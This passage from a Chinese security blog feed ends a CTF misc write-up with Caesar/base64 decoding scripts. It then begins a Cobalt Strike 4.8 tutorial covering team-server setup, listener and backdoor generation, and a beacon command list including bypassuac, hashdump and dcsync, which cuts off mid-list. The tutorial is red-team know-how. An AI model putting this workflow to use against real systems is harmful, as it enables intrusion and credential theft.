hJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJD4hJDBhJD4hLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrDjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBLLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLhphLzBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhDjBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDpLJDBhJDBhJDtrLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJBphJDthJDphJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhLzphJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLhphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhDjBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJBphLzphJDBhJDBhMjBhJDBhJDBvJDBhJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthDjBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJBphJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsDjBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhMjBhJDBhMjBsJDBhMjBhJDBhLxphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhDjBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBLJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhLzBhJDBhJDBhLxphJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphMjBvJD4hLzBhJDBhMjBhJDBhDjthJDBhJDBhJDthJDphJDBhJDBsLjBrJDthJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBLJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJBphJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJBphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhMjBhJDBhMjBhJDBhMjBhJDBhDj4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphMjBvJDthMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBLJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><blockquote><p>看到末尾的=，想到base64，所以是凯撒与base64的结合。</p><p>先用脚本爆破凯撒，将结果用base64编码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 截取文件最前面一部分进行猜测，因为根据后面可知这一部分是近似的四字符反复重复</span></span><br><span class="line">key = <span class="string">&quot;JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBh&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 遍历凯撒加密中25种的可能性</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">    str_encrypt = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= letter &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            str_encrypt += <span class="built_in">chr</span>((<span class="built_in">ord</span>(letter) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;A&quot;</span> &lt;= letter &lt;= <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">            str_encrypt += <span class="built_in">chr</span>((<span class="built_in">ord</span>(letter) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 输出每一种可能性最后的结果</span></span><br><span class="line">    <span class="built_in">print</span>(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241119234133869.png" alt="image-20241119234133869"></p><blockquote><p>结果中发现只有当n=25时，会出现starry语言特有的+，*等符号</p><p>于是用脚本将其全部转化成starry语言</p></blockquote><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&quot;C:<span class="subst">\\</span>Users<span class="subst">\\</span>Lucky<span class="subst">\\</span>Desktop<span class="subst">\\</span>华科杯<span class="subst">\\</span>misc<span class="subst">\\</span>一闪一闪亮晶晶<span class="subst">\\</span>flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding<span class="operator">=</span><span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:    #flag.txt是凯撒密码的文本</span><br><span class="line">    str_encrypt <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    n <span class="operator">=</span> <span class="number">25</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> f.read():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> <span class="operator">&lt;=</span> letter <span class="operator">&lt;=</span> <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> chr((ord(letter) <span class="operator">-</span> ord(<span class="string">&quot;a&quot;</span>) <span class="operator">+</span> n) <span class="operator">%</span> <span class="number">26</span> <span class="operator">+</span> ord(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        elif <span class="string">&quot;A&quot;</span> <span class="operator">&lt;=</span> letter <span class="operator">&lt;=</span> <span class="string">&quot;Z&quot;</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> chr((ord(letter) <span class="operator">-</span> ord(<span class="string">&quot;A&quot;</span>) <span class="operator">+</span> n) <span class="operator">%</span> <span class="number">26</span> <span class="operator">+</span> ord(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str_encrypt <span class="operator">+=</span> letter</span><br><span class="line">    <span class="keyword">open</span>(<span class="string">&quot;C:<span class="subst">\\</span>Users<span class="subst">\\</span>Lucky<span class="subst">\\</span>Desktop<span class="subst">\\</span>华科杯<span class="subst">\\</span>misc<span class="subst">\\</span>一闪一闪亮晶晶<span class="subst">\\</span>flag.starry&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><blockquote><p>最后用starry语言转换脚本转换就能得到flag</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&#x27;</span>)     <span class="selector-id">#flag</span>.starry是保存的starry语言文件</span><br><span class="line">data = fp<span class="selector-class">.read</span>()</span><br><span class="line">fs = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)       <span class="selector-id">#f</span>.txt是输出的中间文件</span><br><span class="line">sub = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        continue</span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        sub += <span class="number">1</span></span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">1</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;dup\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">2</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;swap\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">3</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;rotate\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">4</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;pop\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;push  &#x27;</span> + <span class="built_in">str</span>(sub-<span class="number">5</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;+\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">1</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;-\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">2</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;*\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">3</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;/\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        elif sub == <span class="number">4</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;%\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error!!!&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">            sys<span class="selector-class">.exit</span>()</span><br><span class="line">    elif <span class="selector-tag">i</span> == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> sub == <span class="number">0</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;num_out\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fs<span class="selector-class">.write</span>(<span class="string">&#x27;char_out\n&#x27;</span>)</span><br><span class="line">            sub = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error!!!!&#x27;</span>)</span><br><span class="line">        sys<span class="selector-class">.exit</span>()</span><br><span class="line">fp<span class="selector-class">.close</span>()</span><br><span class="line">fs<span class="selector-class">.close</span>()</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = <span class="selector-attr">[]</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">line</span> <span class="keyword">in</span> fp:</span><br><span class="line">    <span class="selector-tag">line</span> = <span class="selector-tag">line</span><span class="selector-class">.strip</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">line</span><span class="selector-attr">[:4]</span> == <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="built_in">int</span>(<span class="selector-tag">line</span><span class="selector-class">.split</span>(<span class="string">&#x27;  &#x27;</span>)<span class="selector-attr">[1]</span>))</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span> * y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span> + y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">y</span> = data[-<span class="number">2</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-2]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="attribute">x</span>-y)&lt;<span class="number">0</span>:</span><br><span class="line">            data<span class="selector-class">.append</span>(<span class="attribute">y</span>-x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data<span class="selector-class">.append</span>(<span class="attribute">x</span>-y)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;dup&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        data<span class="selector-class">.append</span>(<span class="attribute">x</span>)</span><br><span class="line">    elif <span class="selector-tag">line</span> == <span class="string">&#x27;char_out&#x27;</span>:</span><br><span class="line">        <span class="attribute">x</span> = data[-<span class="number">1</span>]</span><br><span class="line">        data = data<span class="selector-attr">[:-1]</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="attribute">x</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error!!!&#x27;</span>)</span><br><span class="line">        sys<span class="selector-class">.exit</span>()</span><br></pre></td></tr></table></figure><blockquote><p>flag{785c45ea-d2a1-4993-8d4f-325323d5bcd9}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike4.8汉化版带插件使用方法</title>
      <link href="/posts/4aeca11a.html"/>
      <url>/posts/4aeca11a.html</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike4-8汉化版带插件使用方法"><a href="#CobaltStrike4-8汉化版带插件使用方法" class="headerlink" title="CobaltStrike4.8汉化版带插件使用方法"></a>CobaltStrike4.8汉化版带插件使用方法</h1><p>使用大致流程<br>创建团队服务器-&gt;客户端连接服务器-&gt;创建监听器-&gt;生成后门对应监听器-&gt;靶机运行后门成功上线-&gt;后渗透（提权，内网漫游，域渗透等）</p><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="在这里插入图片描述"><br>把全部文件下上传到外网VPS上，并给足权限<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="在这里插入图片描述"><br>服务端运行起来<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="在这里插入图片描述"></p><p>本地电脑使用<a href="https://so.csdn.net/so/search?q=客户端&amp;spm=1001.2101.3001.7020">客户端</a>连接即可<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="在这里插入图片描述"><br>主要输入<code>HOST、Port、password</code>即可</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="在这里插入图片描述"></p><h2 id="二、上线"><a href="#二、上线" class="headerlink" title="二、上线"></a>二、上线</h2><h3 id="1、设置监听器"><a href="#1、设置监听器" class="headerlink" title="1、设置监听器"></a>1、设置监听器</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="在这里插入图片描述"></p><h3 id="2、生成木马后门"><a href="#2、生成木马后门" class="headerlink" title="2、生成木马后门"></a>2、生成木马后门</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="在这里插入图片描述"><br>运行即可上线CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="在这里插入图片描述"></p><p>3、指令大全</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 注入受害者浏览器进程</span><br><span class="line"><span class="built_in">sleep</span> <span class="number">3</span> 全部命令<span class="number">3</span>秒执行</span><br><span class="line">bypassuac 绕过UAC</span><br><span class="line">cancel 取消正在进行的下载</span><br><span class="line">cd 切换目录</span><br><span class="line">checkin 强制让被控端回连一次</span><br><span class="line">clear 清除beacon内部的任务队列</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn 部署Covert VPN客户端</span><br><span class="line">cp 复制文件</span><br><span class="line">dcsync 从DC中提取密码哈希</span><br><span class="line">desktop 远程VNC</span><br><span class="line">dllinject 反射DLL注入进程</span><br><span class="line">dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line">download 下载文件</span><br><span class="line">downloads 列出正在进行的文件下载</span><br><span class="line">drives 列出目标盘符</span><br><span class="line">elevate 尝试提权</span><br><span class="line">execute 在目标上执行程序(无输出)</span><br><span class="line">execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line">exit 退出beacon</span><br><span class="line">getprivs Enable <span class="keyword">system</span> privileges oncurrent token</span><br><span class="line">getsystem 尝试获取<span class="keyword">SYSTEM</span>权限</span><br><span class="line">getuid 获取用户ID</span><br><span class="line">hashdump 转储密码哈希值</span><br><span class="line">help 帮助</span><br><span class="line">inject 在特定进程中生成会话</span><br><span class="line"><span class="built_in">jobkill</span> 杀死一个后台任务</span><br><span class="line">jobs 列出后台任务</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line">kerberos_ticket_purge 